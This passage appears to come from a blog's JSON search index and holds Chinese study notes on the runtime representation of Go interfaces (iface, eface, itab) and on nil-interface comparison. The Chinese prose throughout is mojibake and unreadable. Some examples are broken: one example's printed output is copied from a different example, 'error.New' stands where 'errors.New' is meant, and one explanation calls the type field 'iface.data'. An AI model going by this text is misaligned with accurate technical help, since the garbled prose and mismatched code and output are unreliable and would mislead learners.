¹æ®è¿™äº›ä¿¡æ¯å¯¹å®å‚è¿›è¡Œæ£€æŸ¥ã€‚ å¯æ˜¯ï¼Œå¦‚æœå‡½æ•°æˆ–æ–¹æ³•çš„å‚æ•°ç±»å‹ä¸ºç©ºæ¥å£interface{}ï¼Œç¼–è¯‘å™¨æ— æ³•å¾—çŸ¥å®å‚çš„ä»»ä½•ä¿¡æ¯ï¼Œå› æ­¤åªæœ‰åˆ°è¿è¡Œæ—¶æ‰èƒ½å‘ç°é”™è¯¯ã€‚ æ€»ç»“ Go è¯­è¨€é€šè¿‡ç±»å‹åµŒå…¥ï¼ˆType Embeddingï¼‰å®ç°å‚ç›´ç»„åˆ æ°´å¹³ç»„åˆå°±æ˜¯é€šè¿‡æ¥å£å°†å„ä¸ªå‚ç›´ç»„åˆå‡ºçš„ç±»å‹â€œè€¦åˆâ€åœ¨ä¸€èµ·ï¼Œæœ‰å¤šç§æ¨¡å¼ å°½é‡ä¸è¦ä½¿ç”¨å¯ä»¥â€œé€ƒè¿‡â€ç¼–è¯‘å™¨ç±»å‹å®‰å…¨æ£€æŸ¥çš„ç©ºæ¥å£ç±»å‹ interface{} å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”æ¥å£è¿è¡Œæ—¶è¡¨ç¤º","slug":"go-language-study-notes-interface-runtime-representation","date":"2022-11-03T14:55:28.000Z","updated":"2023-02-18T03:28:33.590Z","comments":true,"path":"go-language-study-notes-interface-runtime-representation/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-interface-runtime-representation/","excerpt":"æ¥å£åœ¨ Go ä¸­çš„åœ°ä½éå¸¸é«˜ï¼Œè¿™æ˜¯å› ä¸ºæ¥å£æ˜¯ Go è¿™é—¨é™æ€è¯­è¨€ä¸­å”¯ä¸€â€œåŠ¨é™å…¼å®¹â€çš„è¯­æ³•ç‰¹æ€§ã€‚","text":"æ¥å£åœ¨ Go ä¸­çš„åœ°ä½éå¸¸é«˜ï¼Œè¿™æ˜¯å› ä¸ºæ¥å£æ˜¯ Go è¿™é—¨é™æ€è¯­è¨€ä¸­å”¯ä¸€â€œåŠ¨é™å…¼å®¹â€çš„è¯­æ³•ç‰¹æ€§ã€‚ é™æ€ç‰¹æ€§ä¸åŠ¨æ€ç‰¹æ€§æ¥å£çš„é™æ€ç‰¹æ€§ä½“ç°åœ¨æ¥å£ç±»å‹å˜é‡å…·æœ‰é™æ€ç±»å‹ã€‚\\ æ‹¥æœ‰é™æ€ç±»å‹æ„å‘³ç€ç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘é˜¶æ®µå¯¹æ‰€æœ‰æ¥å£ç±»å‹å˜é‡çš„èµ‹å€¼æ“ä½œè¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œç¼–è¯‘å™¨ä¼šæ£€æŸ¥å³å€¼çš„ç±»å‹æ˜¯å¦å®ç°äº†è¯¥æ¥å£æ–¹æ³•é›†åˆçš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰å®ç°ï¼Œåˆ™ä¼šç¼–è¯‘å¤±è´¥ã€‚è€Œä¸æ˜¯ç­‰åˆ°è¿è¡Œæ—¶æ‰ä¼šæ£€æŸ¥ã€‚ 1var err error = 1 // cannot use 1 (type int) as type error in assignment: int does not implement error (missing Error method) æ¥å£çš„åŠ¨æ€ä½“ç°åœ¨æ¥å£ç±»å‹å˜é‡åœ¨è¿è¡Œæ—¶è¿˜å­˜å‚¨äº†å³å€¼çš„çœŸå®ç±»å‹ä¿¡æ¯ï¼Œè¿™ä¸ªå³å€¼çš„çœŸå®ç±»å‹ä¿¡æ¯è¢«ç§°ä¸ºæ¥å£ç±»å‹å˜é‡çš„åŠ¨æ€ç±»å‹ã€‚ 123var err errorerr = error.New(\"error1\")fmt.Printf(\"%T \\n\", err) // *errors.errorString ä»ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œerr æ¥å£ç±»å‹å˜é‡æ˜¯ errors.New æ„é€ çš„ä¸€ä¸ªé”™è¯¯å€¼ï¼Œå€ŸåŠ© fmt.Printf å‡½æ•°è¾“å‡ºäº†æ¥å£ç±»å‹å˜é‡çš„åŠ¨æ€ç±»å‹æ˜¯ *errors.errorStringã€‚ åŠ¨é™å…¼å®¹çš„ç‰¹æ€§æœ‰ä»€ä¹ˆå¥½å¤„æ¥å£ç±»å‹å˜é‡åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå¯ä»¥è¢«èµ‹å€¼ä¸ºä¸åŒçš„åŠ¨æ€ç±»å‹å˜é‡ï¼Œæ¯æ¬¡èµ‹å€¼åï¼Œæ¥å£ç±»å‹å˜é‡ä¸­å­˜å‚¨çš„åŠ¨æ€ç±»å‹ä¿¡æ¯éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™è®© Go è¯­è¨€å¯ä»¥åƒåŠ¨æ€è¯­è¨€ï¼ˆPythonï¼‰é‚£æ ·æ‹¥æœ‰é¸­å­ç±»å‹ï¼ˆDuck Typingï¼‰çš„çµæ´»æ€§ã€‚ ä»€ä¹ˆæ˜¯é¸­å­ç±»å‹ï¼Ÿ å°±æ˜¯æŒ‡æŸç±»å‹æ‰€è¡¨ç°å‡ºçš„ç‰¹æ€§ï¼ˆæ¯”å¦‚æ˜¯å¦å¯ä»¥ä½œä¸ºæŸæ¥å£ç±»å‹çš„å³å€¼ï¼‰ï¼Œä¸æ˜¯ç”±å…¶åŸºå› ï¼ˆæ¯”å¦‚ C++ ä¸­çš„çˆ¶ç±»ï¼‰å†³å®šçš„ï¼Œè€Œæ˜¯ç”±ç±»å‹æ‰€è¡¨ç°å‡ºæ¥çš„è¡Œä¸ºï¼ˆæ¯”å¦‚ç±»å‹æ‹¥æœ‰çš„æ–¹æ³•ï¼‰å†³å®šçš„ã€‚ æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š 1234567891011121314151617181920212223242526type QuackableAnimal interface &#123; Quack()&#125;type Duck struct&#123;&#125;func (Duck) Quack() &#123; println(\"duck quack!\")&#125;type Dog struct&#123;&#125;func (Dog) Quack() &#123; println(\"dog quack!\")&#125;type Bird struct&#123;&#125;func (Bird) Quack() &#123; println(\"bird quack!\")&#125; func AnimalQuackInForest(a QuackableAnimal) &#123; a.Quack() &#125; func main() &#123; animals := []QuackableAnimal&#123;new(Duck), new(Dog), new(Bird)&#125; for _, animal := range animals &#123; AnimalQuackInForest(animal) &#125; &#125; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨æ¥å£ç±»å‹ QuackableAnimal æ¥ä»£è¡¨å…·æœ‰â€œä¼šå«â€ï¼ˆQuack()æ–¹æ³•ï¼‰è¿™ä¸€ç‰¹å¾çš„åŠ¨ç‰©ï¼Œè€Œ Duckã€Bird å’Œ Dog ç±»å‹å„è‡ªéƒ½å…·æœ‰è¿™æ ·çš„ç‰¹å¾ï¼Œ è¿™é‡Œçš„ Duckã€Birdã€Dod éƒ½æ˜¯â€œé¸­å­ç±»å‹â€ï¼Œå®ƒä»¬ä¹‹é—´å¹¶æ²¡æœ‰ä»€ä¹ˆè”ç³»ï¼Œä¹‹æ‰€ä»¥èƒ½ä½œä¸ºå³å€¼èµ‹å€¼ç»™ QuackableAnimal ç±»å‹å˜é‡ï¼Œåªæ˜¯å› ä¸ºä»–ä»¬è¡¨ç°å‡ºäº† QuackableAnimal æ‰€è¦æ±‚çš„ç‰¹å¾ç½¢äº†ï¼Œä¹Ÿå°±æ˜¯æ‹¥æœ‰ Quack() æ–¹æ³•ï¼Œè€Œä¸éœ€è¦ä¸¥æ ¼çš„ç»§æ‰¿ä½“ç³»ã€‚ ä¸åŠ¨æ€è¯­è¨€ä¸åŒçš„æ˜¯ï¼ŒGo æ¥å£è¿˜å¯ä»¥ä¿è¯â€œåŠ¨æ€ç‰¹æ€§â€ä½¿ç”¨æ—¶çš„å®‰å…¨æ€§ã€‚æ¯”å¦‚ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘æœŸå°±å¯ä»¥æ•æ‰åˆ°å°† int ç±»å‹å˜é‡ä¼ ç»™ QuackableAnimal æ¥å£ç±»å‹å˜é‡è¿™æ ·çš„æ˜æ˜¾é”™è¯¯ï¼Œå†³ä¸ä¼šè®©è¿™æ ·çš„é”™è¯¯é—æ¼åˆ°è¿è¡Œæ—¶æ‰è¢«å‘ç°ã€‚ ä¸€ä¸ªé—®é¢˜æ¥ä¸‹æ¥é€šè¿‡ä¸€ä¸ªé—®é¢˜æ¥æ›´æ·±å…¥è®¤è¯†ä¸€ä¸‹åŠ¨é™ç‰¹æ€§ã€‚ 123456789101112131415161718192021222324type MyError struct &#123; error&#125;var ErrBad = MyError&#123; error: errors.New(\"bad things happened\"),&#125;func bad() bool &#123; return false&#125;func returnsError() error &#123; var p *MyError = nil if bad() &#123; p = &amp;ErrBad &#125; return p&#125;func main() &#123; err := returnsError() if err != nil &#123; fmt.Printf(\"error occur: %+v\\n\", err) return &#125; fmt.Println(\"ok\")&#125; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œç¨‹åºçš„è¿è¡Œé€»è¾‘å¾ˆæ¸…æ™°ï¼Œè°ƒç”¨ returnsError å‡½æ•°è¿”å›æŒ‡é’ˆå˜é‡ pï¼Œå€¼ä¸º nilï¼Œç„¶åæ¯”è¾ƒ err å˜é‡æ˜¯å¦ç­‰äº nilï¼Œæœ€åè¾“å‡ºç»“æœã€‚ è¿è¡Œä¸€ä¸‹ç¤ºä¾‹ä»£ç ï¼Œçœ‹çœ‹ç»“æœæ˜¯å¦å’Œé¢„æœŸä¸€è‡´ï¼š 1error occur: &lt;nil&gt; å¯ä»¥çœ‹åˆ°ï¼Œå¹¶æ²¡æœ‰è¾“å‡ºé¢„æœŸçš„ okï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿè¦ææ¸…æ¥šè¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦è¿›ä¸€æ­¥äº†è§£æ¥å£ç±»å‹å˜é‡çš„å†…éƒ¨è¡¨ç¤ºã€‚ æ¥å£ç±»å‹å˜é‡çš„å†…éƒ¨è¡¨ç¤ºæ¥å£ç±»å‹â€œåŠ¨é™å…¼å¤‡â€çš„ç‰¹æ€§ä¹Ÿå†³å®šäº†å®ƒçš„å˜é‡çš„å†…éƒ¨è¡¨ç¤ºç»ä¸åƒä¸€ä¸ªé™æ€ç±»å‹å˜é‡ï¼ˆå¦‚ intã€float64ï¼‰é‚£æ ·ç®€å•ã€‚ åœ¨Go çš„æºç ä¸­å¯ä»¥æ‰¾åˆ°æ¥å£ç±»å‹å˜é‡åœ¨è¿è¡Œæ—¶çš„è¡¨ç¤ºï¼š 123456789// $GOROOT/src/runtime/runtime2.gotype iface struct &#123; tab *itab data unsafe.Pointer&#125;type eface struct &#123; _type *_type data unsafe.Pointer&#125; å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿è¡Œæ—¶å±‚é¢ï¼Œæ¥å£ç±»å‹å˜é‡æœ‰ä¸¤ç§å†…éƒ¨è¡¨ç¤ºï¼šiface å’Œ efaceï¼Œè¿™ä¸¤ç§è¡¨ç¤ºåˆ†åˆ«ç”¨äºä¸åŒçš„æ¥å£ç±»å‹å˜é‡ï¼š eface ç”¨äºè¡¨ç¤ºæ²¡æœ‰æ–¹æ³•çš„ç©ºæ¥å£ï¼ˆempty interfaceï¼‰ç±»å‹å˜é‡ï¼Œä¹Ÿå°±æ˜¯ interface{}ç±»å‹çš„å˜é‡ iface ç”¨äºè¡¨ç¤ºå…¶ä½™æ‹¥æœ‰æ–¹æ³•çš„æ¥å£ interface ç±»å‹å˜é‡ å®ƒä»¬çš„å…±åŒç‚¹æ˜¯éƒ½æ‹¥æœ‰ä¸¤ä¸ªæŒ‡é’ˆå­—æ®µï¼Œå¹¶ä¸”åŠŸèƒ½ç›¸åŒï¼Œéƒ½æ˜¯æŒ‡å‘å½“å‰èµ‹å€¼ç»™è¯¥æ¥å£ç±»å‹å˜é‡çš„åŠ¨æ€ç±»å‹å˜é‡çš„å€¼ã€‚ ä¸åŒç‚¹åœ¨äºï¼Œeface è¡¨ç¤ºç©ºæ¥å£ç±»å‹ï¼Œå¹¶æ²¡æœ‰æ–¹æ³•åˆ—è¡¨ï¼Œå› æ­¤å®ƒçš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆå­—æ®µæŒ‡å‘ä¸€ä¸ª _type ç±»å‹ç»“æ„ï¼Œè¿™ä¸ªæ¥å£ä¸ºè¯¥æ¥å£ç±»å‹å˜é‡çš„åŠ¨æ€ç±»å‹ä¿¡æ¯ï¼Œå®šä¹‰æ˜¯è¿™æ ·çš„ï¼š 12345678910111213141516171819// $GOROOT/src/runtime/type.gotype _type struct &#123; size uintptr ptrdata uintptr // size of memory prefix holding all pointers hash uint32 tflag tflag align uint8 fieldAlign uint8 kind uint8 // function for comparing objects of this type // (ptr to object A, ptr to object B) -&gt; ==? equal func(unsafe.Pointer, unsafe.Pointer) bool // gcdata stores the GC type data for the garbage collector. // If the KindGCProg bit is set in kind, gcdata is a GC program. // Otherwise it is a ptrmask bitmap. See mbitmap.go for details. gcdata *byte str nameOff ptrToThis typeOff&#125; è€Œ iface é™¤äº†è¦å­˜å‚¨åŠ¨æ€ç±»å‹ä¿¡æ¯ä¹‹å¤–ï¼Œè¿˜æœ‰å­˜å‚¨æ¥å£æœ¬èº«çš„ä¿¡æ¯ï¼ˆæ¥å£çš„ç±»å‹ä¿¡æ¯ã€æ–¹æ³•åˆ—è¡¨ä¿¡æ¯ç­‰ï¼‰ä»¥åŠåŠ¨æ€ç±»å‹æ‰€å®ç°çš„æ–¹æ³•çš„ä¿¡æ¯ï¼Œå› æ­¤ iface çš„ç¬¬ä¸€ä¸ªå­—æ®µæŒ‡å‘ä¸€ä¸ªitabç±»å‹ç»“æ„ã€‚itab ç»“æ„çš„å®šä¹‰å¦‚ä¸‹ï¼š 12345678// $GOROOT/src/runtime/runtime2.gotype itab struct &#123; inter *interfacetype _type *_type hash uint32 // copy of _type.hash. Used for type switches. _ [4]byte fun [1]uintptr // variable sized. fun[0]==0 means _type does not implement inter.&#125; æ ¸å¿ƒå­—æ®µå¦‚ä¸‹ï¼š interï¼šå­˜å‚¨ç€è¿™ä¸ªæ¥å£ç±»å‹è‡ªèº«çš„ä¿¡æ¯ _typeï¼šå­˜å‚¨ç€è¿™ä¸ªæ¥å£ç±»å‹å˜é‡çš„åŠ¨æ€ç±»å‹çš„ä¿¡æ¯ funcï¼šåŠ¨æ€ç±»å‹å·²å®ç°çš„æ¥å£æ–¹æ³•çš„è°ƒç”¨åœ°å€æ•°ç»„ å…¶ä¸­ interfacetype ç»“æ„çš„å®šä¹‰å¦‚ä¸‹ï¼š 123456// $GOROOT/src/runtime/type.gotype interfacetype struct &#123; typ _type // interfacetype ç»“æ„ç”±ç±»å‹ä¿¡æ¯ pkgpath name // åŒ…è·¯å¾„å mhdr []imethod // æ¥å£æ–¹æ³•é›†åˆåˆ‡ç‰‡ï¼ˆmhdrï¼‰&#125; ä¸ºäº†æ›´å¥½åœ°ç†è§£ eface ä¸ iface åœ¨å†…å­˜çš„è¡¨ç¤ºï¼Œä¸‹é¢åˆ†åˆ« ç©ºæ¥å£ç±»å‹å†…å­˜ä¸­è¡¨ç¤º1234567891011121314151617type T struct &#123; name string age int&#125;func main() &#123; var t = T&#123; age: 23, name: \"yumi\", &#125; var ei interface&#123;&#125; = t // Goè¿è¡Œæ—¶ä½¿ç”¨efaceç»“æ„è¡¨ç¤ºei println(\"ei = \", ei) // ei = (0x1097d60,0xc00000c030) fmt.Println(\"ei = \", ei) // ei = &#123;yumi 23&#125; fmt.Printf(\"%T \\n\", ei) // main.T &#125; è¯¥ç¤ºä¾‹ä»£ç ä¸­çš„ç©ºæ¥å£ç±»å‹å˜é‡ ei åœ¨å†…å­˜ä¸­çš„è¡¨ç¤º å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ç©ºæ¥å£ç±»å‹çš„è¡¨ç¤ºè¾ƒä¸ºç®€å•ï¼š _type å­—æ®µæŒ‡å‘å®ƒçš„åŠ¨æ€ç±»å‹ T çš„ç±»å‹ä¿¡æ¯ data å­—æ®µæŒ‡å‘ä¸€ä¸ª T ç±»å‹çš„å®ä¾‹å€¼ éç©ºæ¥å£ç±»å‹å†…å­˜ä¸­è¡¨ç¤º12345678910111213141516171819202122232425type T struct &#123; name string age int&#125;func (t T) M1() &#123;&#125;func (t T) M2() &#123;&#125;type NonEmptyInterface interface &#123; M1() M2()&#125;func main() &#123; var t = T&#123; name: \"yumi\", age: 23, &#125; var i NonEmptyInterface = t println(\"i = \", i) // i = (0x10c2248,0xc0000a4018) fmt.Println(\"i = \", i) // i = &#123;yumi 23&#125; fmt.Printf(\"%T \\n\", i) // main.T&#125; å’Œ eface æ¯”èµ·æ¥ï¼Œiface çš„è¡¨ç¤ºç¨å¾®å¤æ‚äº›ï¼Œä¸‹å›¾æ˜¯ æ¥å£ç±»å‹å˜é‡i åœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºï¼š è™½ç„¶ eface å’Œ iface çš„ç¬¬ä¸€ä¸ªå­—æ®µæœ‰æ‰€å·®åˆ«ï¼Œä½† tab å’Œ _type å¯ä»¥ç»Ÿä¸€çœ‹ä½œæ˜¯åŠ¨æ€ç±»å‹ä¿¡æ¯ã€‚Go è¯­è¨€ä¸­æ¯ç§ç±»å‹éƒ½ä¼šæœ‰å”¯ä¸€çš„ _type ä¿¡æ¯ï¼Œæ— è®ºæ˜¯å†…ç½®åŸç”Ÿç±»å‹ï¼Œè¿˜æ˜¯è‡ªå®šä¹‰ç±»å‹éƒ½æœ‰ã€‚Go è¿è¡Œæ—¶ä¼šä¸ºç¨‹åºå†…çš„å…¨éƒ¨ç±»å‹å»ºç«‹åªè¯»çš„å…±äº« _type ä¿¡æ¯è¡¨ï¼Œå› æ­¤æ‹¥æœ‰ç›¸åŒåŠ¨æ€ç±»å‹çš„åŒç±»æ¥å£ç±»å‹å˜é‡çš„ _type/tab ä¿¡æ¯æ˜¯ç›¸åŒçš„ã€‚ æ¥å£ç±»å‹å˜é‡çš„ data éƒ¨åˆ†åˆ™æ˜¯æŒ‡å‘ä¸€ä¸ªåŠ¨æ€åˆ†é…çš„å†…å­˜ç©ºé—´ï¼Œè¿™ä¸ªå†…å­˜ç©ºé—´å­˜å‚¨çš„æ˜¯èµ‹å€¼ç»™æ¥å£ç±»å‹å˜é‡çš„åŠ¨æ€ç±»å‹å˜é‡çš„å€¼ã€‚æœªæ˜¾å¼åˆå§‹åŒ–çš„æ¥å£ç±»å‹å˜é‡çš„å€¼ä¸º nilï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå˜é‡çš„ _type/tab å’Œ data éƒ½ä¸º nilã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ¤æ–­ä¸¤ä¸ªæ¥å£ç±»å‹å˜é‡æ˜¯å¦ç›¸åŒï¼Œåªéœ€è¦åˆ¤æ–­ _type/tab æ˜¯å¦ç›¸åŒï¼Œä»¥åŠ data æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ç©ºé—´æ‰€å­˜å‚¨çš„æ•°æ®å€¼æ˜¯å¦ç›¸åŒå°±å¯ä»¥äº†ã€‚æ³¨æ„ ğŸš§ï¼Œè¿™é‡Œä¸æ˜¯ data æŒ‡é’ˆçš„å€¼ç›¸åŒã€‚ æ¯”è¾ƒæ¥å£å˜é‡nil æ¥å£å˜é‡æœªèµ‹åˆå€¼çš„æ¥å£ç±»å‹å˜é‡çš„å€¼ä¸º nilï¼Œè¿™ç±»å˜é‡ä¹Ÿå°±æ˜¯ nil æ¥å£å˜é‡ï¼Œä¸‹é¢æ¥çœ‹ä¸€ä¸‹å†…å­˜ä¸­è¡¨ç¤ºè¾“å‡ºçš„ä¾‹å­ï¼š 12345678910func printNilInterface() &#123; // nilæ¥å£å˜é‡ var i interface&#123;&#125; // ç©ºæ¥å£ç±»å‹ var err error // éç©ºæ¥å£ç±»å‹ println(i) println(err) println(\"i = nil:\", i == nil) println(\"err = nil:\", err == nil) println(\"i = err:\", i == err)&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 12345(0x0,0x0)(0x0,0x0)i = nil: trueerr = nil: truei = err: true å¯ä»¥çœ‹åˆ°ï¼Œæ— è®ºæ˜¯ç©ºæ¥å£ç±»å‹å˜é‡è¿˜æ˜¯éç©ºæ¥å£ç±»å‹å˜é‡ï¼Œä¸€æ—¦å˜é‡å€¼ä¸º nilï¼Œé‚£ä¹ˆå®ƒä»¬å†…éƒ¨è¡¨ç¤ºå‡ä¸º(0x0,0x0)ï¼Œä¹Ÿå°±æ˜¯ç±»å‹ä¿¡æ¯ã€æ•°æ®å€¼ä¿¡æ¯å‡ä¸ºç©ºã€‚å› æ­¤ä¸Šé¢çš„å˜é‡ i å’Œ err ç­‰å€¼åˆ¤æ–­ä¸º trueã€‚ ç©ºæ¥å£ç±»å‹å˜é‡ä¸‹é¢æ˜¯ç©ºæ¥å£ç±»å‹å˜é‡çš„å†…éƒ¨è¡¨ç¤ºè¾“å‡ºçš„ä¾‹å­ï¼š 123456789101112131415161718192021func printEmptyInterface() &#123; var eif1 interface&#123;&#125; // ç©ºæ¥å£ç±»å‹ var eif2 interface&#123;&#125; // ç©ºæ¥å£ç±»å‹ var n, m int = 17, 18 eif1 = n eif2 = m println(\"eif1:\", eif1) println(\"eif2:\", eif2) println(\"eif1 = eif2:\", eif1 == eif2) // false eif2 = 17 println(\"eif1:\", eif1) println(\"eif2:\", eif2) println(\"eif1 = eif2:\", eif1 == eif2) // true eif2 = int64(17) println(\"eif1:\", eif1) println(\"eif2:\", eif2) println(\"eif1 = eif2:\", eif1 == eif2) // false&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123456789eif1: (0x10ac580,0xc00007ef48)eif2: (0x10ac580,0xc00007ef40)eif1 = eif2: falseeif1: (0x10ac580,0xc00007ef48)eif2: (0x10ac580,0x10eb3d0)eif1 = eif2: trueeif1: (0x10ac580,0xc00007ef48)eif2: (0x10ac640,0x10eb3d8)eif1 = eif2: false ç¤ºä¾‹ä»£ç çš„é€»è¾‘å¾ˆæ¸…æ™°ï¼š ç¬¬ä¸€æ¬¡æ‰“å°ï¼šåŠ¨æ€ç±»å‹çš„ç±»å‹ä¿¡æ¯æ˜¯ç›¸åŒçš„ï¼ˆéƒ½æ˜¯ intï¼‰ï¼Œæ‰€ä»¥ _type éƒ½æ˜¯0x10ac580ï¼Œä½†æ˜¯ data æŒ‡é’ˆæŒ‡å‘å†…å­˜ä¸­å­˜å‚¨çš„å€¼ä¸ä¸€æ ·ï¼Œå› æ­¤ eif1 ä¸ç­‰äº eif2 ç¬¬äºŒæ¬¡æ‰“å°ï¼šåŠ¨æ€ç±»å‹çš„ç±»å‹ä¿¡æ¯æ˜¯ç›¸åŒçš„ï¼Œdata æŒ‡é’ˆæŒ‡å‘å†…å­˜ä¸­å­˜å‚¨çš„å€¼ä¹Ÿç›¸åŒï¼Œå› æ­¤ eif1 ç­‰äº eif2 ç¬¬ä¸‰æ¬¡æ‰“å°ï¼šåŠ¨æ€ç±»å‹çš„ç±»å‹ä¿¡æ¯ä¸åŒï¼ˆä¸€ä¸ªæ˜¯ intï¼Œä¸€ä¸ªæ˜¯ int64ï¼‰ï¼Œå³ä¾¿ data æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å—ä¸­å­˜å‚¨å€¼æ˜¯ç›¸åŒçš„ï¼Œæœ€ç»ˆ eif1 ä¹Ÿä¸ç­‰äº eif2 ç»“è®ºï¼šå¯¹äºç©ºæ¥å£ç±»å‹å˜é‡ï¼Œåªæœ‰ _type å’Œ data æ‰€æŒ‡æ•°æ®å†…å®¹ä¸€è‡´çš„æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªç©ºæ¥å£ç±»å‹å˜é‡ä¹‹é—´æ‰èƒ½åˆ’ç­‰å·ã€‚ éç©ºæ¥å£ç±»å‹å˜é‡1234567891011121314151617181920type T intfunc (t T) Error() string &#123; return \"bad error\"&#125;func printNonEmptyInterface() &#123; var err1 error // éç©ºæ¥å£ç±»å‹ var err2 error // éç©ºæ¥å£ç±»å‹ err1 = (*T)(nil) println(\"err1:\", err1) println(\"err1 = nil:\", err1 == nil) err1 = T(5) err2 = T(6) println(\"err1:\", err1) println(\"err2:\", err2) println(\"err1 = err2:\", err1 == err2) err2 = fmt.Errorf(\"%d\\n\", 5) println(\"err1:\", err1) println(\"err2:\", err2) println(\"err1 = err2:\", err1 == err2)&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123456789eif1: (0x10ac580,0xc00007ef48)eif2: (0x10ac580,0xc00007ef40)eif1 = eif2: falseeif1: (0x10ac580,0xc00007ef48)eif2: (0x10ac580,0x10eb3d0)eif1 = eif2: trueeif1: (0x10ac580,0xc00007ef48)eif2: (0x10ac640,0x10eb3d8)eif1 = eif2: false çœ‹åˆ°ä¸Šé¢ç¤ºä¾‹ä¸­æ¯ä¸€è½®é€šè¿‡ println è¾“å‡ºçš„ err1 å’Œ err2 çš„ tab å’Œ data å€¼ï¼Œè¦ä¹ˆ data å€¼ä¸åŒï¼Œè¦ä¹ˆ tab ä¸ data å€¼éƒ½ä¸åŒã€‚ å’Œç©ºæ¥å£ç±»å‹å˜é‡ä¸€æ ·ï¼Œåªæœ‰ tab å’Œ data æŒ‡çš„æ•°æ®å†…å®¹ä¸€è‡´çš„æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªéç©ºæ¥å£ç±»å‹å˜é‡ä¹‹é—´æ‰èƒ½åˆ’ç­‰å·ã€‚ è¿™é‡Œæˆ‘ä»¬è¦æ³¨æ„ err1 ä¸‹é¢çš„èµ‹å€¼æƒ…å†µï¼š 1err1 &#x3D; (*T)(nil) é’ˆå¯¹è¿™ç§èµ‹å€¼ï¼Œprintln è¾“å‡ºçš„ err1 æ˜¯ï¼ˆ0x10ed120, 0x0ï¼‰ï¼Œä¹Ÿå°±æ˜¯éç©ºæ¥å£ç±»å‹å˜é‡çš„ç±»å‹ä¿¡æ¯å¹¶ä¸ä¸ºç©ºï¼Œæ•°æ®æŒ‡é’ˆä¸ºç©ºï¼Œå› æ­¤å®ƒä¸ nilï¼ˆ0x0,0x0ï¼‰ä¹‹é—´ä¸èƒ½åˆ’ç­‰å·ã€‚ ç°åœ¨æˆ‘ä»¬å†å›åˆ°æˆ‘ä»¬å¼€å¤´çš„é‚£ä¸ªé—®é¢˜ï¼Œä½ æ˜¯ä¸æ˜¯å·²ç»è±ç„¶å¼€æœ—äº†å‘¢ï¼Ÿå¼€å¤´çš„é—®é¢˜ä¸­ï¼Œä» returnsError è¿”å›çš„ error æ¥å£ç±»å‹å˜é‡ err çš„æ•°æ®æŒ‡é’ˆè™½ç„¶ä¸ºç©ºï¼Œä½†å®ƒçš„ç±»å‹ä¿¡æ¯ï¼ˆiface.tabï¼‰å¹¶ä¸ä¸ºç©ºï¼Œè€Œæ˜¯ *MyError å¯¹åº”çš„ç±»å‹ä¿¡æ¯ï¼Œè¿™æ · err ä¸ nilï¼ˆ0x0,0x0ï¼‰ç›¸æ¯”è‡ªç„¶ä¸ç›¸ç­‰ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å¼€å¤´é‚£ä¸ªé—®é¢˜çš„ç­”æ¡ˆè§£æï¼Œç°åœ¨ä½ æ˜ç™½äº†å—ï¼Ÿ ç°åœ¨å†å›å¤´çœ‹ä¸Šé¢é‚£ä¸ªé—®é¢˜ï¼Œæ˜¯ä¸æ˜¯æ¸…æ™°å¾ˆå¤šäº†ã€‚å› ä¸º returnsError è¿”å›çš„ error æ¥å£ç±»å‹å˜é‡ err çš„æ•°æ®æŒ‡é’ˆè™½ç„¶ä¸ºç©ºï¼Œä½†å®ƒçš„ç±»å‹ä¿¡æ¯ï¼ˆiface.data) å¹¶ä¸ä¸ºç©ºï¼Œè€Œæ˜¯ *MyError å¯¹åº”çš„ç±»å‹ä¿¡æ¯ï¼Œå› æ­¤ err ä¸ nil å¹¶ä¸ç›¸ç­‰ã€‚ ç©ºæ¥å£ç±»å‹å˜é‡ä¸éç©ºæ¥å£ç±»å‹å˜é‡çš„ç­‰å€¼æ¯”è¾ƒ1234567891011func printEmptyInterfaceAndNonEmptyInterface() &#123; var eif interface&#123;&#125; = T(5) var err error = T(5) println(\"eif:\", eif) println(\"err:\", err) println(\"eif = err:\", eif == err) err = T(6) println(\"eif:\", eif) println(\"err:\", err) println(\"eif = err:\", eif == err)&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123456eif: (0x1093500,0x10c0808)err: (0x10c0d58,0x10c0808)eif = err: trueeif: (0x1093500,0x10c0808)err: (0x10c0d58,0x10c0810)eif = err: false å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶ç©ºæ¥å£ç±»å‹å˜é‡ï¼ˆeface(_type, 